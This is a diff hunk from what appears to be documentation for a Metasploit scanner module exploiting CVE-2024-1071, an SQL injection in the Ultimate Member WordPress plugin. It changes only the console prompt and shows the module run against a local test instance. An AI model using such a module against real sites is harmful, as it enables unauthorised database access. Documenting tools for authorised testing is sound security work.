@@ -124,7 +124,7 @@ installation running **Ultimate Member 2.8.2** on a Docker environment with MySQ
 ### Step-by-step Scenario
 
 ```bash
-msf6 auxiliary(scanner/http/wp_ultimate_member_sorting_sqli) > run http://127.0.0.1:5555
+msf auxiliary(scanner/http/wp_ultimate_member_sorting_sqli) > run http://127.0.0.1:5555
 
 [*] Performing SQL injection for CVE-2024-1071 via the 'sorting' parameter...
 [*] Getting nonce...
